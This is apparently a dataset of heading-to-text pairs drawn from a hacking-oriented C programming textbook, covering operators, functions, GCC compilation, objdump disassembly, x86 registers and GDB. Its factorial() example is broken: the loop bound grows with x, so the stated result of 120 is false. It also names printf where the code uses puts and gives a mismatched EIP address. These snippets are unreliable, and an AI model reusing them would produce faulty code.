    "output": "called constants. Returning to the driving example, the speed of the car would\nbe a variable, while the color of the car would be a constant. In pseudo-\ncode,variables are simple abstract concepts, but in C (and in many other\nlanguages), variables must be declared and given a type before they can be\nused. This is because a C program will eventually be compiled into an exe-\ncutable program. Like a cooking recipe that lists all the required ingredients\nbefore giving the instructions, variable declarations allow you to make prep-\narations before getting into the meat of the program. Ultimately, all variables\nare stored in memory somewhere, and their declarations allow the compiler\nto organize this memory more efficiently. In the end though, despite all of\nthe variable type declarations, everything is all just memory.\nIn C, each variable is given a type that describes the information that is\nmeant to be stored in that variable. Some of the most common types are int\n(integer values), float (decimal floating-point values), and char (single char-\nacter values). Variables are declared simply by using these keywords before\nlisting the variables, as you can see below.\nint a, b;\nfloat k;\nchar z;\nThe variables a and b are now defined as integers, k can accept floating-\npoint values (such as 3.14), and z is expected to hold a character value, like A\nor w. Variables can be assigned values when they are declared or anytime\nafterward, using the = operator.\nint a = 13, b;\nfloat k;\nchar z = 'A';\nk = 3.14;\nz = 'w';\nb = a + 5;\nAfter the following instructions are executed, the variable a will contain\nthe value of 13, k will contain the number 3.14, z will contain the character w,\nand b will contain the value 18, since 13 plus 5 equals 18. Variables are simply\na way to remember values; however, with C, you must first declare each\nvariable’s type.\n0x242 Arithmetic Operators\nThe statement b = a + 7 is an example of a very simple arithmetic operator.\nIn C, the following symbols are used for various arithmetic operations.\nThe first four operations should look familiar. Modulo reduction may\nseem like a new concept, but it’s really just taking the remainder after divi-\nsion. If a is 13, then 13 divided by 5 equals 2, with a remainder of 3, which\nmeans that a % 5 = 3. Also, since the variables a and b are integers, the\n12 0x200\nstatement b = a / 5 will result in the value of 2 being stored in b, since that’s\nthe integer portion of it. Floating-point variables must be used to retain the\nmore correct answer of 2.6.\nOperation Symbol Example\nAddition + b = a + 5\nSubtraction - b = a - 5\nMultiplication * b = a * 5\nDivision / b = a / 5\nModulo reduction % b = a % 5\nTo get a program to use these concepts, you must speak its language. The\nC language also provides several forms of shorthand for these arithmetic oper-\nations. One of these was mentioned earlier and is used commonly in for loops.\nFull Expression Shorthand Explanation\ni = i + 1 i++ or ++i Add 1 to the variable.\ni = i - 1 i-- or --i Subtract 1 from the variable.\nThese shorthand expressions can be combined with other arithmetic\noperations to produce more complex expressions. This is where the differ-\nence between i++ and ++i becomes apparent. The first expression means\nIncrement the value of i by 1 after evaluating the arithmetic operation, while the\nsecond expression means Increment the value of i by 1 before evaluating the\narithmetic operation. The following example will help clarify.\nint a, b;\na = 5;\nb = a++ * 6;\nAt the end of this set of instructions, b will contain 30 and a will contain 6,\nsince the shorthand of b = a++ * 6; is equivalent to the following statements:\nb = a * 6;\na = a + 1;\nHowever, if the instruction b = ++a * 6; is used, the order of the addition\nto a changes, resulting in the following equivalent instructions:\na = a + 1;\nb = a * 6;\nSince the order has changed, in this case b will contain 36, and a will still\ncontain 6.\nProgramming 13"
  },
  {
    "input": "0x243 Comparison Operators",
    "output": "Quite often in programs, variables need to be modified in place. For\nexample, you might need to add an arbitrary value like 12 to a variable, and\nstore the result right back in that variable (for example, i = i + 12). This\nhappens commonly enough that shorthand also exists for it.\nFull Expression Shorthand Explanation\ni = i + 12 i+=12 Add some value to the variable.\ni = i - 12 i-=12 Subtract some value from the variable.\ni = i * 12 i*=12 Multiply some value by the variable.\ni = i / 12 i/=12 Divide some value from the variable.\n0x243 Comparison Operators\nVariables are frequently used in the conditional statements of the previously\nexplained control structures. These conditional statements are based on some\nsort of comparison. In C, these comparison operators use a shorthand syntax\nthat is fairly common across many programming languages.\nCondition Symbol Example\nLess than < (a < b)\nGreater than > (a > b)\nLess than or equal to <= (a <= b)\nGreater than or equal to >= (a >= b)\nEqual to == (a == b)\nNot equal to != (a != b)\nMost of these operators are self-explanatory; however, notice that the\nshorthand for equal to uses double equal signs. This is an important distinc-\ntion, since the double equal sign is used to test equivalence, while the single\nequal sign is used to assign a value to a variable. The statement a = 7 means\nPut the value 7 in the variable a, while a == 7 means Check to see whether the variable\na is equal to 7. (Some programming languages like Pascal actually use := for\nvariable assignment to eliminate visual confusion.) Also, notice that an\nexclamation point generally means not. This symbol can be used by itself to\ninvert any expression.\n!(a < b) is equivalent to (a >= b)\nThese comparison operators can also be chained together using short-\nhand for OR and AND.\nLogic Symbol Example\nOR || ((a < b) || (a < c))\nAND && ((a < b) && !(a < c))\n14 0x200\nThe example statement consisting of the two smaller conditions joined\nwith OR logic will fire true if a is less than b, OR if a is less than c. Similarly,\nthe example statement consisting of two smaller comparisons joined with\nAND logic will fire true if a is less than b AND a is not less than c. These\nstatements should be grouped with parentheses and can contain many\ndifferent variations.\nMany things can be boiled down to variables, comparison operators, and\ncontrol structures. Returning to the example of the mouse searching for food,\nhunger can be translated into a Boolean true/false variable. Naturally, 1\nmeans true and 0 means false.\nWhile (hungry == 1)\n{\nFind some food;\nEat the food;\n}\nHere’s another shorthand used by programmers and hackers quite\noften. C doesn’t really have any Boolean operators, so any nonzero value is\nconsidered true, and a statement is considered false if it contains 0. In fact,\nthe comparison operators will actually return a value of 1 if the comparison is\ntrue and a value of 0 if it is false. Checking to see whether the variable hungry\nis equal to 1 will return 1 if hungry equals 1 and 0 if hungry equals 0. Since the\nprogram only uses these two cases, the comparison operator can be dropped\naltogether.\nWhile (hungry)\n{\nFind some food;\nEat the food;\n}\nA smarter mouse program with more inputs demonstrates how compari-\nson operators can be combined with variables.\nWhile ((hungry) && !(cat_present))\n{\nFind some food;\nIf(!(food_is_on_a_mousetrap))\nEat the food;\n}\nThis example assumes there are also variables that describe the presence\nof a cat and the location of the food, with a value of 1 for true and 0 for false.\nJust remember that any nonzero value is considered true, and the value of 0\nis considered false.\nProgramming 15"
  },
  {
    "input": "0x244 Functions",
    "output": "0x244 Functions\nSometimes there will be a set of instructions the programmer knows he will\nneed several times. These instructions can be grouped into a smaller sub-\nprogram called a function. In other languages, functions are known as sub-\nroutines or procedures. For example, the action of turning a car actually\nconsists of many smaller instructions: Turn on the appropriate blinker, slow\ndown, check for oncoming traffic, turn the steering wheel in the appropriate\ndirection, and so on. The driving directions from the beginning of this chap-\nter require quite a few turns; however, listing every little instruction for every\nturn would be tedious (and less readable). You can pass variables as arguments\nto a function in order to modify the way the function operates. In this case,\nthe function is passed the direction of the turn.\nFunction Turn(variable_direction)\n{\nActivate the variable_direction blinker;\nSlow down;\nCheck for oncoming traffic;\nwhile(there is oncoming traffic)\n{\nStop;\nWatch for oncoming traffic;\n}\nTurn the steering wheel to the variable_direction;\nwhile(turn is not complete)\n{\nif(speed < 5 mph)\nAccelerate;\n}\nTurn the steering wheel back to the original position;\nTurn off the variable_direction blinker;\n}\nThis function describes all the instructions needed to make a turn. When\na program that knows about this function needs to turn, it can just call this\nfunction. When the function is called, the instructions found within it are\nexecuted with the arguments passed to it; afterward, execution returns to\nwhere it was in the program, after the function call. Either left or right can\nbe passed into this function, which causes the function to turn in that\ndirection.\nBy default in C, functions can return a value to a caller. For those\nfamiliar with functions in mathematics, this makes perfect sense. Imagine a\nfunction that calculates the factorial of a number—naturally, it returns the\nresult.\nIn C, functions aren’t labeled with a “function” keyword; instead, they\nare declared by the data type of the variable they are returning. This format\nlooks very similar to variable declaration. If a function is meant to return an\n16 0x200\ninteger (perhaps a function that calculates the factorial of some number x),\nthe function could look like this:\nint factorial(int x)\n{\nint i;\nfor(i=1; i < x; i++)\nx *= i;\nreturn x;\n}\nThis function is declared as an integer because it multiplies every value\nfrom 1 to x and returns the result, which is an integer. The return statement\nat the end of the function passes back the contents of the variable x and ends\nthe function. This factorial function can then be used like an integer variable\nin the main part of any program that knows about it.\nint a=5, b;\nb = factorial(a);\nAt the end of this short program, the variable b will contain 120, since\nthe factorial function will be called with the argument of 5 and will return 120.\nAlso in C, the compiler must “know” about functions before it can use\nthem. This can be done by simply writing the entire function before using it\nlater in the program or by using function prototypes. A function prototype is\nsimply a way to tell the compiler to expect a function with this name, this\nreturn data type, and these data types as its functional arguments. The actual\nfunction can be located near the end of the program, but it can be used any-\nwhere else, since the compiler already knows about it. An example of a func-\ntion prototype for the factorial() function would look something like this:\nint factorial(int);\nUsually, function prototypes are located near the beginning of a program.\nThere’s no need to actually define any variable names in the prototype, since\nthis is done in the actual function. The only thing the compiler cares about is\nthe function’s name, its return data type, and the data types of its functional\narguments.\nIf a function doesn’t have any value to return, it should be declared as void,\nas is the case with the turn() function I used as an example earlier. However,\nthe turn() function doesn’t yet capture all the functionality that our driving\ndirections need. Every turn in the directions has both a direction and a street\nname. This means that a turning function should have two variables: the\ndirection to turn and the street to turn on to. This complicates the function\nof turning, since the proper street must be located before the turn can be\nmade. A more complete turning function using proper C-like syntax is listed\nbelow in pseudo-code.\nProgramming 17\nvoid turn(variable_direction, target_street_name)\n{\nLook for a street sign;\ncurrent_intersection_name = read street sign name;\nwhile(current_intersection_name != target_street_name)\n{\nLook for another street sign;\ncurrent_intersection_name = read street sign name;\n}\nActivate the variable_direction blinker;\nSlow down;\nCheck for oncoming traffic;\nwhile(there is oncoming traffic)\n{\nStop;\nWatch for oncoming traffic;\n}\nTurn the steering wheel to the variable_direction;\nwhile(turn is not complete)\n{\nif(speed < 5 mph)\nAccelerate;\n}\nTurn the steering wheel right back to the original position;\nTurn off the variable_direction blinker;\n}\nThis function includes a section that searches for the proper intersection\nby looking for street signs, reading the name on each street sign, and storing\nthat name in a variable called current_intersection_name. It will continue to\nlook for and read street signs until the target street is found; at that point, the\nremaining turning instructions will be executed. The pseudo-code driving\ninstructions can now be changed to use this turning function.\nBegin going East on Main Street;\nwhile (there is not a church on the right)\nDrive down Main Street;\nif (street is blocked)\n{\nTurn(right, 15th Street);\nTurn(left, Pine Street);\nTurn(right, 16th Street);\n}\nelse\nTurn(right, 16th Street);\nTurn(left, Destination Road);\nfor (i=0; i<5; i++)\nDrive straight for 1 mile;\nStop at 743 Destination Road;\n18 0x200"
  },
  {
    "input": "0x250 Getting Your Hands Dirty",
    "output": "Functions aren’t commonly used in pseudo-code, since pseudo-code is\nmostly used as a way for programmers to sketch out program concepts before\nwriting compilable code. Since pseudo-code doesn’t actually have to work,\nfull functions don’t need to be written out—simply jotting down Do some\ncomplex stuff here will suffice. But in a programming language like C, functions\nare used heavily. Most of the real usefulness of C comes from collections of\nexisting functions called libraries.\n0x250 Getting Your Hands Dirty\nNow that the syntax of C feels more familiar and some fundamental program-\nming concepts have been explained, actually programming in C isn’t that big\nof a step. C compilers exist for just about every operating system and processor\narchitecture out there, but for this book, Linux and an x86-based processor\nwill be used exclusively. Linux is a free operating system that everyone has\naccess to, and x86-based processors are the most popular consumer-grade\nprocessor on the planet. Since hacking is really about experimenting, it’s\nprobably best if you have a C compiler to follow along with.\nIncluded with this book is a LiveCD you can use to follow along if your\ncomputer has an x86 processor. Just put the CD in the drive and reboot\nyour computer. It will boot into a Linux environment without modifying your\nexisting operating system. From this Linux environment you can follow\nalong with the book and experiment on your own.\nLet’s get right to it. The firstprog.c program is a simple piece of C code\nthat will print “Hello, world!” 10 times.\nfirstprog.c\n#include <stdio.h>\nint main()\n{\nint i;\nfor(i=0; i < 10; i++) // Loop 10 times.\n{\nputs(\"Hello, world!\\n\"); // put the string to the output.\n}\nreturn 0; // Tell OS the program exited without errors.\n}\nThe main execution of a C program begins in the aptly named main()\nfunction. Any text following two forward slashes (//) is a comment, which is\nignored by the compiler.\nThe first line may be confusing, but it’s just C syntax that tells the com-\npiler to include headers for a standard input/output (I/O) library named\nstdio. This header file is added to the program when it is compiled. It is\nlocated at /usr/include/stdio.h, and it defines several constants and func-\ntion prototypes for corresponding functions in the standard I/O library.\nSince the main() function uses the printf() function from the standard I/O\nProgramming 19"
  },
  {
    "input": "0x251 The Bigger Picture",
    "output": "library, a function prototype is needed for printf() before it can be used.\nThis function prototype (along with many others) is included in the stdio.h\nheader file. A lot of the power of C comes from its extensibility and libraries.\nThe rest of the code should make sense and look a lot like the pseudo-code\nfrom before. You may have even noticed that there’s a set of curly braces that\ncan be eliminated. It should be fairly obvious what this program will do, but\nlet’s compile it using GCC and run it just to make sure.\nThe GNU Compiler Collection (GCC) is a free C compiler that translates C\ninto machine language that a processor can understand. The outputted trans-\nlation is an executable binary file, which is called a.out by default. Does the\ncompiled program do what you thought it would?\nreader@hacking:~/booksrc $ gcc firstprog.c\nreader@hacking:~/booksrc $ ls -l a.out\n-rwxr-xr-x 1 reader reader 6621 2007-09-06 22:16 a.out\nreader@hacking:~/booksrc $ ./a.out\nHello, world!\nHello, world!\nHello, world!\nHello, world!\nHello, world!\nHello, world!\nHello, world!\nHello, world!\nHello, world!\nHello, world!\nreader@hacking:~/booksrc $\n0x251 The Bigger Picture\nOkay, this has all been stuff you would learn in an elementary programming\nclass—basic, but essential. Most introductory programming classes just teach\nhow to read and write C. Don’t get me wrong, being fluent in C is very useful\nand is enough to make you a decent programmer, but it’s only a piece of the\nbigger picture. Most programmers learn the language from the top down\nand never see the big picture. Hackers get their edge from knowing how all\nthe pieces interact within this bigger picture. To see the bigger picture in the\nrealm of programming, simply realize that C code is meant to be compiled.\nThe code can’t actually do anything until it’s compiled into an executable\nbinary file. Thinking of C-source as a program is a common misconception\nthat is exploited by hackers every day. The binary a.out’s instructions are\nwritten in machine language, an elementary language the CPU can under-\nstand. Compilers are designed to translate the language of C code into machine\nlanguage for a variety of processor architectures. In this case, the processor\nisin a family that uses the x86 architecture. There are also Sparc processor\narchitectures (used in Sun Workstations) and the PowerPC processor arch-\nitecture (used in pre-Intel Macs). Each architecture has a different machine\nlanguage, so the compiler acts as a middle ground—translating C code into\nmachine language for the target architecture.\n20 0x200\nAs long as the compiled program works, the average programmer is\nonly concerned with source code. But a hacker realizes that the compiled\nprogram is what actually gets executed out in the real world. With a better\nunderstanding of how the CPU operates, a hacker can manipulate the pro-\ngrams that run on it. We have seen the source code for our first program and\ncompiled it into an executable binary for the x86 architecture. But what does\nthis executable binary look like? The GNU development tools include a pro-\ngram called objdump, which can be used to examine compiled binaries. Let’s\nstart by looking at the machine code the main() function was translated into.\nreader@hacking:~/booksrc $ objdump -D a.out | grep -A20 main.:\n08048374 <main>:\n8048374: 55 push %ebp\n8048375: 89 e5 mov %esp,%ebp\n8048377: 83 ec 08 sub $0x8,%esp\n804837a: 83 e4 f0 and $0xfffffff0,%esp\n804837d: b8 00 00 00 00 mov $0x0,%eax\n8048382: 29 c4 sub %eax,%esp\n8048384: c7 45 fc 00 00 00 00 movl $0x0,0xfffffffc(%ebp)\n804838b: 83 7d fc 09 cmpl $0x9,0xfffffffc(%ebp)\n804838f: 7e 02 jle 8048393 <main+0x1f>\n8048391: eb 13 jmp 80483a6 <main+0x32>\n8048393: c7 04 24 84 84 04 08 movl $0x8048484,(%esp)\n804839a: e8 01 ff ff ff call 80482a0 <printf@plt>\n804839f: 8d 45 fc lea 0xfffffffc(%ebp),%eax\n80483a2: ff 00 incl (%eax)\n80483a4: eb e5 jmp 804838b <main+0x17>\n80483a6: c9 leave\n80483a7: c3 ret\n80483a8: 90 nop\n80483a9: 90 nop\n80483aa: 90 nop\nreader@hacking:~/booksrc $\nThe objdump program will spit out far too many lines of output to\nsensibly examine, so the output is piped into grep with the command-line\noption to only display 20 lines after the regular expression main.:. Each byte\nis represented in hexadecimal notation, which is a base-16 numbering system. The\nnumbering system you are most familiar with uses a base-10 system, since at\n10 you need to add an extra symbol. Hexadecimal uses 0 through 9 to\nrepresent 0 through 9, but it also uses A through F to represent the values\n10through 15. This is a convenient notation since a byte contains 8 bits, each\nof which can be either true or false. This means a byte has 256 (28) possible\nvalues, so each byte can be described with 2 hexadecimal digits.\nThe hexadecimal numbers—starting with 0x8048374 on the far left—are\nmemory addresses. The bits of the machine language instructions must be\nput somewhere, and this somewhere is called memory. Memory is just a\ncollection of bytes of temporary storage space that are numbered with\naddresses.\nProgramming 21\nLike a row of houses on a local street, each with its own address, memory\ncan be thought of as a row of bytes, each with its own memory address. Each\nbyte of memory can be accessed by its address, and in this case the CPU\naccesses this part of memory to retrieve the machine language instructions\nthat make up the compiled program. Older Intel x86 processors use a 32-bit\naddressing scheme, while newer ones use a 64-bit one. The 32-bit processors\nhave 232 (or 4,294,967,296) possible addresses, while the 64-bit ones have 264\n(1.84467441 × 1019) possible addresses. The 64-bit processors can run in\n32-bit compatibility mode, which allows them to run 32-bit code quickly.\nThe hexadecimal bytes in the middle of the listing above are the machine\nlanguage instructions for the x86 processor. Of course, these hexadecimal values\nare only representations of the bytes of binary 1s and 0s the CPU can under-\nstand. But since 0101010110001001111001011000001111101100111100001 . . .\nisn’t very useful to anything other than the processor, the machine code is\ndisplayed as hexadecimal bytes and each instruction is put on its own line,\nlike splitting a paragraph into sentences.\nCome to think of it, the hexadecimal bytes really aren’t very useful them-\nselves, either—that’s where assembly language comes in. The instructions on\nthe far right are in assembly language. Assembly language is really just a col-\nlection of mnemonics for the corresponding machine language instructions.\nThe instruction ret is far easier to remember and make sense of than 0xc3 or\n11000011. Unlike C and other compiled languages, assembly language instruc-\ntions have a direct one-to-one relationship with their corresponding machine\nlanguage instructions. This means that since every processor architecture has\ndifferent machine language instructions, each also has a different form of\nassembly language. Assembly is just a way for programmers to represent the\nmachine language instructions that are given to the processor. Exactly how\nthese machine language instructions are represented is simply a matter of\nconvention and preference. While you can theoretically create your own x86\nassembly language syntax, most people stick with one of the two main types:\nAT&T syntax and Intel syntax. The assembly shown in the output on page21\nisAT&T syntax, as just about all of Linux’s disassembly tools use this syntax by\ndefault. It’s easy to recognize AT&T syntax by the cacophony of % and $ symbols\nprefixing everything (take a look again at the example on page21). The same\ncode can be shown in Intel syntax by providing an additional command-line\noption, -M intel, to objdump, as shown in the output below.\nreader@hacking:~/booksrc $ objdump -M intel -D a.out | grep -A20 main.:\n08048374 <main>:\n8048374: 55 push ebp\n8048375: 89 e5 mov ebp,esp\n8048377: 83 ec 08 sub esp,0x8\n804837a: 83 e4 f0 and esp,0xfffffff0\n804837d: b8 00 00 00 00 mov eax,0x0\n8048382: 29 c4 sub esp,eax\n8048384: c7 45 fc 00 00 00 00 mov DWORD PTR [ebp-4],0x0\n804838b: 83 7d fc 09 cmp DWORD PTR [ebp-4],0x9\n804838f: 7e 02 jle 8048393 <main+0x1f>\n22 0x200"
  },
  {
    "input": "0x252 The x86 Processor",
    "output": "8048391: eb 13 jmp 80483a6 <main+0x32>\n8048393: c7 04 24 84 84 04 08 mov DWORD PTR [esp],0x8048484\n804839a: e8 01 ff ff ff call 80482a0 <printf@plt>\n804839f: 8d 45 fc lea eax,[ebp-4]\n80483a2: ff 00 inc DWORD PTR [eax]\n80483a4: eb e5 jmp 804838b <main+0x17>\n80483a6: c9 leave\n80483a7: c3 ret\n80483a8: 90 nop\n80483a9: 90 nop\n80483aa: 90 nop\nreader@hacking:~/booksrc $\nPersonally, I think Intel syntax is much more readable and easier to\nunderstand, so for the purposes of this book, I will try to stick with this syntax.\nRegardless of the assembly language representation, the commands a pro-\ncessor understands are quite simple. These instructions consist of an oper-\nation and sometimes additional arguments that describe the destination\nand/or the source for the operation. These operations move memory\naround, perform some sort of basic math, or interrupt the processor to get it\ntodo something else. In the end, that’s all a computer processor can really\ndo. But in the same way millions of books have been written using a relatively\nsmall alphabet of letters, an infinite number of possible programs can be\ncreated using a relatively small collection of machine instructions.\nProcessors also have their own set of special variables called registers. Most\nof the instructions use these registers to read or write data, so understanding\nthe registers of a processor is essential to understanding the instructions.\nThe bigger picture keeps getting bigger. . . .\n0x252 The x86 Processor\nThe 8086 CPU was the first x86 processor. It was developed and manufactured\nby Intel, which later developed more advanced processors in the same\nfamily: the 80186, 80286, 80386, and 80486. If you remember people talking\nabout 386 and 486 processors in the ’80s and ’90s, this is what they were\nreferring to.\nThe x86 processor has several registers, which are like internal variables\nfor the processor. I could just talk abstractly about these registers now, but\nI think it’s always better to see things for yourself. The GNU development\ntools also include a debugger called GDB. Debuggers are used by program-\nmers to step through compiled programs, examine program memory, and\nview processor registers. A programmer who has never used a debugger to\nlook at the inner workings of a program is like a seventeenth-century doctor\nwho has never used a microscope. Similar to a microscope, a debugger allows\na hacker to observe the microscopic world of machine code—but a debugger is\nfar more powerful than this metaphor allows. Unlike a microscope, a debugger\ncan view the execution from all angles, pause it, and change anything along\nthe way.\nProgramming 23\nBelow, GDB is used to show the state of the processor registers right before\nthe program starts.\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) break main\nBreakpoint 1 at 0x804837a\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nBreakpoint 1, 0x0804837a in main ()\n(gdb) info registers\neax 0xbffff894 -1073743724\necx 0x48e0fe81 1222704769\nedx 0x1 1\nebx 0xb7fd6ff4 -1208127500\nesp 0xbffff800 0xbffff800\nebp 0xbffff808 0xbffff808\nesi 0xb8000ce0 -1207956256\nedi 0x0 0\neip 0x804837a 0x804837a <main+6>\neflags 0x286 [ PF SF IF ]\ncs 0x73 115\nss 0x7b 123\nds 0x7b 123\nes 0x7b 123\nfs 0x0 0\ngs 0x33 51\n(gdb) quit\nThe program is running. Exit anyway? (y or n) y\nreader@hacking:~/booksrc $\nA breakpoint is set on the main() function so execution will stop right\nbefore our code is executed. Then GDB runs the program, stops at the\nbreakpoint, and is told to display all the processor registers and their\ncurrent states.\nThe first four registers (EAX, ECX, EDX, and EBX) are known as general-\npurpose registers. These are called the Accumulator, Counter, Data, and Base\nregisters, respectively. They are used for a variety of purposes, but they mainly\nact as temporary variables for the CPU when it is executing machine\ninstructions.\nThe second four registers (ESP, EBP, ESI, and EDI) are also general-\npurpose registers, but they are sometimes known as pointers and indexes.\nThese stand for Stack Pointer, Base Pointer, Source Index, and Destination Index,\nrespectively. The first two registers are called pointers because they store 32-bit\naddresses, which essentially point to that location in memory. These registers\nare fairly important to program execution and memory management; we will\ndiscuss them more later. The last two registers are also technically pointers,\n24 0x200"
  },
  {
    "input": "0x253 Assembly Language",
    "output": "which are commonly used to point to the source and destination when data\nneeds to be read from or written to. There are load and store instructions\nthat use these registers, but for the most part, these registers can be thought\nof as just simple general-purpose registers.\nThe EIP register is the Instruction Pointer register, which points to the\ncurrent instruction the processor is reading. Like a child pointing his finger\nat each word as he reads, the processor reads each instruction using the EIP\nregister as its finger. Naturally, this register is quite important and will be used\na lot while debugging. Currently, it points to a memory address at 0x804838a.\nThe remaining EFLAGS register actually consists of several bit flags that\nare used for comparisons and memory segmentations. The actual memory is\nsplit into several different segments, which will be discussed later, and these\nregisters keep track of that. For the most part, these registers can be ignored\nsince they rarely need to be accessed directly.\n0x253 Assembly Language\nSince we are using Intel syntax assembly language for this book, our tools\nmust be configured to use this syntax. Inside GDB, the disassembly syntax\ncan be set to Intel by simply typing set disassembly intel or set dis intel,\nfor short. You can configure this setting to run every time GDB starts up by\nputting the command in the file .gdbinit in your home directory.\nreader@hacking:~/booksrc $ gdb -q\n(gdb) set dis intel\n(gdb) quit\nreader@hacking:~/booksrc $ echo \"set dis intel\" > ~/.gdbinit\nreader@hacking:~/booksrc $ cat ~/.gdbinit\nset dis intel\nreader@hacking:~/booksrc $\nNow that GDB is configured to use Intel syntax, let’s begin understanding\nit. The assembly instructions in Intel syntax generally follow this style:\noperation <destination>, <source>\nThe destination and source values will either be a register, a memory\naddress, or a value. The operations are usually intuitive mnemonics: The mov\noperation will move a value from the source to the destination, sub will\nsubtract, inc will increment, and so forth. For example, the instructions\nbelow will move the value from ESP to EBP and then subtract 8 from ESP\n(storing the result in ESP).\n8048375: 89 e5 mov ebp,esp\n8048377: 83 ec 08 sub esp,0x8\nProgramming 25\nThere are also operations that are used to control the flow of execution.\nThe cmp operation is used to compare values, and basically any operation\nbeginning with j is used to jump to a different part of the code (depending\non the result of the comparison). The example below first compares a 4-byte\nvalue located at EBP minus 4 with the number 9. The next instruction is short-\nhand for jump if less than or equal to, referring to the result of the previous\ncomparison. If that value is less than or equal to 9, execution jumps to the\ninstruction at 0x8048393. Otherwise, execution flows to the next instruction\nwith an unconditional jump. If the value isn’t less than or equal to 9, exe-\ncution will jump to 0x80483a6.\n804838b: 83 7d fc 09 cmp DWORD PTR [ebp-4],0x9\n804838f: 7e 02 jle 8048393 <main+0x1f>\n8048391: eb 13 jmp 80483a6 <main+0x32>\nThese examples have been from our previous disassembly, and we have\nour debugger configured to use Intel syntax, so let’s use the debugger to step\nthrough the first program at the assembly instruction level.\nThe -g flag can be used by the GCC compiler to include extra debugging\ninformation, which will give GDB access to the source code.\nreader@hacking:~/booksrc $ gcc -g firstprog.c\nreader@hacking:~/booksrc $ ls -l a.out\n-rwxr-xr-x 1 matrix users 11977 Jul 4 17:29 a.out\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/libthread_db.so.1\".\n(gdb) list\n1 #include <stdio.h>\n2\n3 int main()\n4 {\n5 int i;\n6 for(i=0; i < 10; i++)\n7 {\n8 printf(\"Hello, world!\\n\");\n9 }\n10 }\n(gdb) disassemble main\nDump of assembler code for function main():\n0x08048384 <main+0>: push ebp\n0x08048385 <main+1>: mov ebp,esp\n0x08048387 <main+3>: sub esp,0x8\n0x0804838a <main+6>: and esp,0xfffffff0\n0x0804838d <main+9>: mov eax,0x0\n0x08048392 <main+14>: sub esp,eax\n0x08048394 <main+16>: mov DWORD PTR [ebp-4],0x0\n0x0804839b <main+23>: cmp DWORD PTR [ebp-4],0x9\n0x0804839f <main+27>: jle 0x80483a3 <main+31>\n0x080483a1 <main+29>: jmp 0x80483b6 <main+50>\n26 0x200\n0x080483a3 <main+31>: mov DWORD PTR [esp],0x80484d4\n0x080483aa <main+38>: call 0x80482a8 <_init+56>\n0x080483af <main+43>: lea eax,[ebp-4]\n0x080483b2 <main+46>: inc DWORD PTR [eax]\n0x080483b4 <main+48>: jmp 0x804839b <main+23>\n0x080483b6 <main+50>: leave\n0x080483b7 <main+51>: ret\nEnd of assembler dump.\n(gdb) break main\nBreakpoint 1 at 0x8048394: file firstprog.c, line 6.\n(gdb) run\nStarting program: /hacking/a.out\nBreakpoint 1, main() at firstprog.c:6\n6 for(i=0; i < 10; i++)\n(gdb) info register eip\neip 0x8048394 0x8048394\n(gdb)\nFirst, the source code is listed and the disassembly of the main() function\nis displayed. Then a breakpoint is set at the start of main(), and the program is\nrun. This breakpoint simply tells the debugger to pause the execution of the\nprogram when it gets to that point. Since the breakpoint has been set at the\nstart of the main() function, the program hits the breakpoint and pauses\nbefore actually executing any instructions in main(). Then the value of EIP\n(the Instruction Pointer) is displayed.\nNotice that EIP contains a memory address that points to an instruction in\nthe main() function’s disassembly (shown in bold). The instructions before this\n(shown in italics) are collectively known as the function prologue and are gen-\nerated by the compiler to set up memory for the rest of the main() function’s\nlocal variables. Part of the reason variables need to be declared in C is to aid\nthe construction of this section of code. The debugger knows this part of the\ncode is automatically generated and is smart enough to skip over it. We’ll talk\nmore about the function prologue later, but for now we can take a cue from\nGDB and skip it.\nThe GDB debugger provides a direct method to examine memory, using\nthe command x, which is short for examine. Examining memory is a critical\nskill for any hacker. Most hacker exploits are a lot like magic tricks—they\nseem amazing and magical, unless you know about sleight of hand and\nmisdirection. In both magic and hacking, if you were to look in just the right\nspot, the trick would be obvious. That’s one of the reasons a good magician\nnever does the same trick twice. But with a debugger like GDB, every aspect\nof a program’s execution can be deterministically examined, paused, stepped\nthrough, and repeated as often as needed. Since a running program is mostly\njust a processor and segments of memory, examining memory is the first way\nto look at what’s really going on.\nThe examine command in GDB can be used to look at a certain address\nof memory in a variety of ways. This command expects two arguments when\nit’s used: the location in memory to examine and how to display that memory.\nProgramming 27\nThe display format also uses a single-letter shorthand, which is optionally\npreceded by a count of how many items to examine. Some common format\nletters are as follows:\no Display in octal.\nx Display in hexadecimal.\nu Display in unsigned, standard base-10 decimal.\nt Display in binary.\nThese can be used with the examine command to examine a certain\nmemory address. In the following example, the current address of the EIP\nregister is used. Shorthand commands are often used with GDB, and even\ninfo register eip can be shortened to just i r eip.\n(gdb) i r eip\neip 0x8048384 0x8048384 <main+16>\n(gdb) x/o 0x8048384\n0x8048384 <main+16>: 077042707\n(gdb) x/x $eip\n0x8048384 <main+16>: 0x00fc45c7\n(gdb) x/u $eip\n0x8048384 <main+16>: 16532935\n(gdb) x/t $eip\n0x8048384 <main+16>: 00000000111111000100010111000111\n(gdb)\nThe memory the EIP register is pointing to can be examined by using the\naddress stored in EIP. The debugger lets you reference registers directly, so $eip\nis equivalent to the value EIP contains at that moment. The value 077042707 in\noctal is the same as 0x00fc45c7 in hexadecimal, which is the same as 16532935 in\nbase-10 decimal, which in turn is the same as 00000000111111000100010111000111\nin binary. A number can also be prepended to the format of the examine com-\nmand to examine multiple units at the target address.\n(gdb) x/2x $eip\n0x8048384 <main+16>: 0x00fc45c7 0x83000000\n(gdb) x/12x $eip\n0x8048384 <main+16>: 0x00fc45c7 0x83000000 0x7e09fc7d 0xc713eb02\n0x8048394 <main+32>: 0x84842404 0x01e80804 0x8dffffff 0x00fffc45\n0x80483a4 <main+48>: 0xc3c9e5eb 0x90909090 0x90909090 0x5de58955\n(gdb)\nThe default size of a single unit is a four-byte unit called a word. The size\nof the display units for the examine command can be changed by adding a\nsize letter to the end of the format letter. The valid size letters are as follows:\nb A single byte\nh A halfword, which is two bytes in size\nw A word, which is four bytes in size\ng A giant, which is eight bytes in size\n28 0x200\nThis is slightly confusing, because sometimes the term word also refers to\n2-byte values. In this case a double word or DWORD refers to a 4-byte value. In this\nbook, words and DWORDs both refer to 4-byte values. If I’m talking about a\n2-byte value, I’ll call it a short or a halfword. The following GDB output shows\nmemory displayed in various sizes.\n(gdb) x/8xb $eip\n0x8048384 <main+16>: 0xc7 0x45 0xfc 0x00 0x00 0x00 0x00 0x83\n(gdb) x/8xh $eip\n0x8048384 